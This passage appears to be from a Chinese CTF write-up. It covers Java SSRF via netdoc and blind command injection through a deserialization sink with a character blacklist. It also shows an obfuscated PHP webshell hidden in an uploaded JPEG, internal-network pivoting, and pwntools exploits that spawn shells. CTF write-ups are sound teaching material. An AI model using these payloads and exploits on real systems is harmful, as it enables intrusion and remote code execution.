<p>然后发现只有<code>A+B</code>问题可以点</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiauiinyrj227w180jx9.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaul3dphj228017ogqx.jpg" alt=""></p>
<p>代码提交页面提供代码提交，查看最后一次提交的代码功能。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaw8k1jjj2280180jwx.jpg" alt=""></p>
<p>引用代码提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">请以代码文件为url，例如http://mysite.com/main.c，仅支持c,cpp,java,py,js,cs的提交</div></pre></td></tr></table></figure>
<p>然后提交一个<code>https://raw.githubusercontent.com/php/php-src/master/ext/zlib/zlib.c</code>，发现返回代码过多，再找个几行代码的<code>https://gitee.com/CheungSSH_OSC/CheungSSH/raw/master/bin/DataConf.py</code></p>
<p>返回提示成功，查看上一次提交代码，发现以源码方式返回。还有个下载代码的功能，得到一个文件名为用户名经过md5后的<code>txt</code>文件。</p>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>既然引用代码处，可以引用<code>http</code>协议的<code>url</code>，那我们可以试试用<code>file</code>如何。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyibr7mtsvj21yo13444v.jpg" alt=""></p>
<p>发现是<code>forbidden</code>，通过<code>fuzz</code>我们可以得到<code>jar netdoc</code>两个<code>java SSRF</code>支持的协议没有被<code>ban</code>，而且需要再最后加入<code>?1.c</code>来绕过后缀检测</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyibz19mwyj21yu18qwmv.jpg" alt=""></p>
<p>然后查看最后一次代码提交，发现并没有什么改变。</p>
<p>试试<code>netdoc</code>，传入<code>netdoc:///?1.c</code></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhkjy5wj21z218sguq.jpg" alt=""></p>
<p>发现可以得到回显</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhhna5tj21ys18gww2.jpg" alt=""></p>
<p>但是直接请求<code>flag</code>，发现被<code>ban</code>掉了，所以我们得另寻他路。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidkqxytej21yu190k01.jpg" alt=""></p>
<h4 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h4><p>通过查看一系列文件，发现如果直接读<code>class</code>文件的话，直接展示出来了<code>class</code>二进制文件，那我们下载下来会不会也是<code>class</code>文件的形式呢</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsve7dlj21yq0v0n5d.jpg" alt=""></p>
<p>下载下来后，我们用<code>file</code>看一下，果然是个<code>java class</code>文件</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsyg0uaj2102038adb.jpg" alt=""></p>
<p>用<code>JD-GUI</code>打开得到源码</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidw0hu30j228018kdpv.jpg" alt=""></p>
<p>题目描述说需要逆向师傅其实指的就是这里需要逆向<code>class</code>文件，（其实也不需要…直接用<code>JD-GUI</code>直接就能看了…</p>
<p>这里省略了其他源码的审计。</p>
<p>然后看到貌似多出的这个<code>User.class</code>类，然后发现了比较敏感的<code>readObject()</code>函数，<code>java</code>反序列化漏洞特征，可能存在<code>java</code>反序列化漏洞</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidyds8e7j227w18uk1b.jpg" alt=""></p>
<p>然后找到其利用的地方，发现在<code>netdoc:///app/webapps/ROOT/WEB-INF/classes/org/nuaa/tomax/logindemo/controller/UserController.class</code>调用了<code>User</code>类。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyie2v8gsnj2280196qfm.jpg" alt=""></p>
<p><code>UserController.class</code>的关键部分:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@PostMapping</span>(&#123;<span class="string">"/record"</span>&#125;)</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">record</span><span class="params">(<span class="keyword">long</span> userId, HttpSession session, String cmd)</span></span></div><div class="line"><span class="function">    <span class="keyword">throws</span> Exception</span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    Timestamp timestamp = <span class="keyword">new</span> Timestamp(System.currentTimeMillis());</div><div class="line">    UserEntity user = (UserEntity)session.getAttribute(<span class="string">"user_"</span> + userId);</div><div class="line">    <span class="keyword">if</span> (cmd != <span class="keyword">null</span>)</div><div class="line">    &#123;</div><div class="line">      User mUsr = <span class="keyword">new</span> User(user.getId(), user.getUsername(), cmd, timestamp);</div><div class="line">      SysUtil.recordCmd(mUsr);</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>在看到<code>SysUtil.class</code>:</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyieei3nmoj2280192tlm.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyieefah7pj227y18qgwt.jpg" alt=""></p>
<p>发现竟然有部分貌似真的需要逆向，但是其实仔细往下看，利用点跟上面那段代码没太大关系。</p>
<p>看到<code>recordCmd()</code>，可以说是非常标准的<code>java</code>反序列化的代码了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recordCmd</span><span class="params">(User user)</span></span></div><div class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object"</span>);</div><div class="line">    ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</div><div class="line">    </div><div class="line">    os.writeObject(user);</div><div class="line">    os.close();</div><div class="line">    </div><div class="line">    FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object"</span>);</div><div class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</div><div class="line">    </div><div class="line">    User outUsr = (User)ois.readObject();</div><div class="line">    ois.close();</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>接着我们回到<code>User.class</code>，很明显，这里可以控制传入<code>cmd</code>，我们再看看<code>User.class</code>的关键代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] BLACKLIST = &#123; <span class="string">"$"</span>, <span class="string">"&#123;"</span>, <span class="string">"&#125;"</span>, <span class="string">"`"</span>, <span class="string">"base64"</span>, <span class="string">"&amp;"</span>, <span class="string">";"</span>, <span class="string">"||"</span>, <span class="string">"%"</span>, <span class="string">"("</span>, <span class="string">")"</span>, <span class="string">"rm"</span>, <span class="string">"echo"</span>&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">long</span> id, String username, String cmd, Timestamp time)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">this</span>.id = id;</div><div class="line">    <span class="keyword">this</span>.username = username;</div><div class="line">    <span class="keyword">this</span>.cmd = cmd;</div><div class="line">    <span class="keyword">this</span>.time = time;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span></span></div><div class="line"><span class="function">    <span class="keyword">throws</span> Exception</span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    in.defaultReadObject();</div><div class="line">    <span class="keyword">if</span> (checkCmd(<span class="keyword">this</span>.cmd).booleanValue())</div><div class="line">    &#123;</div><div class="line">      String cmd_pre = <span class="string">"sleep $("</span>;</div><div class="line">      String cmd_suf = <span class="string">")"</span>;</div><div class="line">      String exec = cmd_pre + <span class="keyword">this</span>.cmd + cmd_suf;</div><div class="line"></div><div class="line">      String[] cmds = &#123; SysUtil.asciiToString(<span class="string">"47,98,105,110,47,98,97,115,104"</span>), SysUtil.asciiToString(<span class="string">"45,99"</span>), exec &#125;;</div><div class="line">      SysUtil.execCmd(cmds);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">public</span> Boolean <span class="title">checkCmd</span><span class="params">(String cmd)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">      <span class="keyword">for</span> (String symbol : BLACKLIST) &#123;</div><div class="line">          <span class="keyword">if</span> (cmd.contains(symbol)) &#123;</div><div class="line">              <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">true</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p><code>cmds</code>转换为<code>ascii</code>就是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">String[] cmds = &#123; <span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, exec &#125;;</div></pre></td></tr></table></figure>
<p><code>exec</code>就是传入的<code>cmd</code>，然而这里利用点比较尴尬，因为我们传入的代码是被<code>exec</code>是被<code>sleep $()</code>给包围起来的，而关键的一些绕过都进了黑名单</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] BLACKLIST = &#123; <span class="string">"$"</span>, <span class="string">"&#123;"</span>, <span class="string">"&#125;"</span>, <span class="string">"`"</span>, <span class="string">"base64"</span>, <span class="string">"&amp;"</span>, <span class="string">";"</span>, <span class="string">"||"</span>, <span class="string">"%"</span>, <span class="string">"("</span>, <span class="string">")"</span>, <span class="string">"rm"</span>, <span class="string">"echo"</span>&#125;;</div></pre></td></tr></table></figure>
<p>这里我们可以使用命令执行盲注的形式进行对<code>flag</code>猜解。稍后我会详细写一篇文章讲解命令盲注的方式。</p>
<p>我们可以采用<code>cat /flag | cut -c 1 | tr N 10</code>这样的形式对<code>flag</code>进行猜解。</p>
<ul>
<li><code>cat /flag</code>读取<code>/flag</code>中的内容</li>
<li><code>cut -c 1</code>截取第一个字符</li>
<li><code>tr N 10</code>用<code>10</code>来代替<code>flag</code>中的字母<code>N</code></li>
</ul>
<p>所以，通过把<code>flag</code>中的内容读出来之后，用字母代替进行<code>sleep</code>，如果猜解对的话，并且排除网络原因，页面会延缓<code>5s</code>才返回，所以我们可以利用这个特性把<code>flag</code>猜解出来。</p>
<p>其实这里设置得不太好，应该把<code>flag</code>改成全英文比较好一些得到<code>flag</code>。也可以用<code>burp intruder</code>来猜解。</p>
<h3 id="Web4-Pentest"><a href="#Web4-Pentest" class="headerlink" title="Web4 Pentest"></a>Web4 Pentest</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">I love Pentest!</div><div class="line"></div><div class="line">做出来的师傅请不要搅屎。 http://ctf.asuri.org:8004</div></pre></td></tr></table></figure>
<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>首先通过扫目录扫出上传页面，然后利用上传处理的错误逻辑，上传带一句话的图片(图片会经过gd库解析)，解析出错不会删除上传的文件（可以在 index 页面看到）， 然后文件包含拿 shell, 得到 web 目录下的 Import_notes 文件，知道需要打登录内网 samba 拿 flag, 于是代理进内网。由于用了 disable_function , 通过下面的文章进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.freebuf.com/articles/web/192052.html</div></pre></td></tr></table></figure>
<p>samba 共享里面有一半 flag , 还需要利用漏洞打内网的另外一台 tomcat ,拿到 shell ， 读取第二部分的 flag</p>
<p>具体利用步骤<br>通过扫目录扫到 <code>upload.php</code> , 可以上传图片，上传后会用 gd 对图片进行二次渲染， 由于代码逻辑不当，当渲染失败时图片依然会保存在服务器上，可以通过 <code>index.php</code> 看到引用的 <code>url</code>.</p>
<p>然后上传文件</p>
<p><img src="https://ws1.sinaimg.cn/large/006daSSqgy1fy8sxqzmwjj31ea0hx78u.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">session = requests.Session()</div><div class="line"></div><div class="line">paramsPost = &#123;&quot;submit&quot;: &quot;\xe4\xb8\x8a\xe4\xbc\xa0&quot;&#125;</div><div class="line">paramsMultipart = [(&apos;upload_file&apos;, (&apos;hac425.jpg&apos;, &quot;\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00\x00\x00\x00\x00\x00\xff\xe10\xcaExif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x04\x011\x00\x02\x00\x00\x00\x0b\x00\x00\x10J\x87i\x00\x04\x00\x00\x00\x01\x00\x00\x10V\x88%\x00\x04\x00\x00\x00\x01\x00\x00 \xa2\xea\x1c\x00\x07\x00\x00\x10\x0c\x00\x00\x00&gt;\x00\x00\x00\x00\x1c\xea\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&lt;?php \x24VsLC=create_function(str_rot13(&apos;\x24&apos;).chr(96600/840).str_rot13(&apos;b&apos;).str_rot13(&apos;z&apos;).chr(0346-0201),base64_decode(&apos;ZQ==&apos;).base64_decode(&apos;dg==&apos;).base64_decode(&apos;YQ==&apos;).chr(0247370/01432).str_rot13(&apos;(&apos;).chr(0x6204/0x2b9).base64_decode(&apos;cw==&apos;).base64_decode(&apos;bw==&apos;).base64_decode(&apos;bQ==&apos;).base64_decode(&apos;ZQ==&apos;).chr(0x13f-0x116).chr(0x397-0x35c));\x24VsLC(base64_decode(&apos;NDE3N&apos;.&apos;jc4O0&apos;.&apos;BldkF&apos;.&apos;sKCRf&apos;.&apos;&apos;.chr(0x3dc-0x387).str_rot13(&apos;R&apos;).chr(423-366).chr(0204170/01446).base64_decode(&apos;Vg==&apos;).&apos;&apos;.&apos;&apos;.chr(01157-01051).chr(0x10ca2/0x256).str_rot13(&apos;k&apos;).chr(0x217-0x1bf).chr(0x5fa5/0x127).&apos;&apos;.&apos;k7MTI&apos;.&apos;1MzAz&apos;.&apos;NDs=&apos;.&apos;&apos;));?&gt;&quot;, &apos;image/jpeg&apos;))]</div><div class="line">response = session.post(&quot;http://192.168.245.142:6655/upload.php&quot;,</div><div class="line">                        data=paramsPost, files=paramsMultipart)</div></pre></td></tr></table></figure>
<p>然后在利用 文件包含漏洞拿 shell, 拿到 shell 之后会发现一个重要的文件</p>
<p><img src="https://ws1.sinaimg.cn/large/006daSSqgy1fy8syh9uwzj30se0i4gmx.jpg" alt=""></p>
<p>文件里面有 <code>samba</code> 的账号密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">机智的我把重要文件都丢内网 samba了， 这里备忘个账户/密码： hac425/123456</div></pre></td></tr></table></figure>
<p>通过这个文件知道 flag 应该在内网的 samba 服务器， 于是上传 busybox+reGeorg ,分别用于查看 ip 和代理。</p>
<p>通过扫描可以知道开启 samba 的机器，然后密码登录拿 flag. 获得提示去扫描其他常见的服务， 80,8080 等，可以找到 tomcat , 于是此时可以尝试利用漏洞打。</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>简单栈溢出，用了随机数模拟了canary，本地生成随机数即可。</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line"></div><div class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./overflow'</span>)</div><div class="line"></div><div class="line">ret = <span class="number">0x80485BD</span></div><div class="line">t = libc.time(<span class="number">0</span>)</div><div class="line">libc.srand(t)</div><div class="line">random = libc.rand()</div><div class="line"></div><div class="line">p.recvline()</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p32(random) + <span class="string">'a'</span>*<span class="number">0xc</span> + p32(ret)</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"><span class="keyword">print</span> p.recvline()</div></pre></td></tr></table></figure>
<h3 id="kvm"><a href="#kvm" class="headerlink" title="kvm"></a>kvm</h3><p>简单的kvm，只需要在vm里面执行端口写操作即可。</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./kvm'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"execute: \n"</span>)</div><div class="line"></div><div class="line">code = asm(<span class="string">'''</span></div><div class="line"><span class="string">	movabs rax, 0x67616c66</span></div><div class="line"><span class="string">  	push 4</span></div><div class="line"><span class="string">  	pop rcx</span></div><div class="line"><span class="string">  	mov edx, 0x100</span></div><div class="line"><span class="string">  OUT:</span></div><div class="line"><span class="string">  	out dx, al</span></div><div class="line"><span class="string">  	shr rax, 8</span></div><div class="line"><span class="string">  	loop OUT</span></div><div class="line"><span class="string">	'''</span>, arch = <span class="string">'amd64'</span>)</div><div class="line"></div><div class="line">p.sendline(code)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"execute again: \n"</span>)</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">p.sendline(asm(shellcraft.amd64.linux.sh(), arch = <span class="string">'amd64'</span>))</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h3 id="password-checker"><a href="#password-checker" class="headerlink" title="password_checker"></a>password_checker</h3><p><code>snprintf</code> 误用， 它返回的是格式化解析后形成的字符串的长度（及期望写入目标缓冲区的长度），而不是实际写入 目标缓冲区的内存长度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">int off = snprintf(buf, 0x100, &quot;name:%s&amp;&quot;, input);</div><div class="line">...........................</div><div class="line">...........................    </div><div class="line">...........................</div><div class="line">// off 可能会比较大，出现越界写</div><div class="line">off = snprintf(buf + off, 0x100 - off, &quot;pwd:%s&quot;, input);</div></pre></td></tr></table></figure>
<p>所以利用 <code>snprintf</code> 让 off 移动到返回地址的位置， 然后写返回地址为 getshell 函数的地址。</p>
<p>具体看 <code>exp</code> 和源码</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</div><div class="line">context.log_level = <span class="string">"debug"</span></div><div class="line"></div><div class="line">binary_path = <span class="string">"../dist/pwn"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># p = process(binary_path)</span></div><div class="line">p = remote(<span class="string">"172.17.0.2"</span>, <span class="number">20000</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"welcome....."</span>)</div><div class="line"><span class="comment"># 计算出需要输入的字符串长度，让 off + buf 能够写到返回地址</span></div><div class="line"><span class="comment"># 还要去掉 pwd: 这 4 个 字节</span></div><div class="line">payload = <span class="string">"a"</span> * (<span class="number">0x10c</span>+<span class="number">4</span><span class="number">-4</span><span class="number">-2</span><span class="number">-4</span>)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"><span class="comment"># gdb.attach(p,"""</span></div><div class="line"><span class="comment"># bp 0x0804873B</span></div><div class="line"><span class="comment"># c</span></div><div class="line"><span class="comment"># """)</span></div><div class="line"><span class="comment"># pause()</span></div><div class="line"></div><div class="line"></div><div class="line">payload = p32(<span class="number">0x08048674</span>)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h3 id="type-confusion"><a href="#type-confusion" class="headerlink" title="type_confusion"></a>type_confusion</h3><p>类型混淆，可以先释放一个 c1类的 obj, 然后分配一个 c2 类的 obj, 然后利用 see c1 obj 的功能调用虚函数，会调用 c2 的虚函数，c2 的相应虚函数的作用就是 system(“sh)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int c2::dump()</div><div class="line">&#123;</div><div class="line">    system(&quot;sh&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>具体看 <code>exp</code> 和源码</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</div><div class="line">context.log_level = <span class="string">"debug"</span></div><div class="line"></div><div class="line">binary_path = <span class="string">"../dist/pwn"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># p = process(binary_path)</span></div><div class="line">p = remote(<span class="string">"172.17.0.2"</span>, <span class="number">20000</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</div><div class="line">p.sendline(<span class="string">"2"</span>)</div><div class="line">p.recvuntil(<span class="string">"Index: "</span>)</div><div class="line">p.sendline(<span class="string">"0"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</div><div class="line">p.sendline(<span class="string">"100"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</div><div class="line">p.sendline(<span class="string">"1"</span>)</div><div class="line">p.recvuntil(<span class="string">"Index: "</span>)</div><div class="line">p.sendline(<span class="string">"0"</span>)</div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="stupid-contract-challenge-rev"><a href="#stupid-contract-challenge-rev" class="headerlink" title="stupid_contract_challenge[rev]"></a>stupid_contract_challenge[rev]</h3><p>简单solidity逆向，源码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^0.4.25;</div><div class="line"></div><div class="line">contract stupidChallenge&#123;</div><div class="line">    bytes32 seed = 0xaaa0adabb79fb8b9bca5a8938fa3a2b8415250476c705b525f5f565d5456124e;</div><div class="line">    function generateFlag() public returns(bytes)&#123;</div><div class="line">        bytes memory finalFlag = new bytes(seed.length);</div><div class="line">        uint i;</div><div class="line">        for(i = 0;i&lt;seed.length/2;i++) &#123;</div><div class="line">            finalFlag[i]=seed[i]^0xcc;</div><div class="line">        &#125;</div><div class="line">        for(;i&lt;seed.length;i++) &#123;</div><div class="line">            finalFlag[i]=seed[i]^0x33;</div><div class="line">        &#125;</div><div class="line">        return finalFlag;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>直接把字节码扔 <a href="https://ethervm.io/decompile" target="_blank" rel="external">https://ethervm.io/decompile</a> 即可</p>
<h3 id="variant-of-cat"><a href="#variant-of-cat" class="headerlink" title="variant_of_cat"></a>variant_of_cat</h3><p>智能合约，整数下溢<br>先调用<code>fightAsuriMonster</code>使得攻击力下溢，再次调用<code>fightBoss</code>即可</p>
<h3 id="STG-TouHou"><a href="#STG-TouHou" class="headerlink" title="STG TouHou"></a>STG TouHou</h3><p>是一个彻头彻尾的车万游戏呢。</p>
<h4 id="正常通关"><a href="#正常通关" class="headerlink" title="正常通关"></a>正常通关</h4><p>通关游戏，会把flag打印在屏幕上</p>
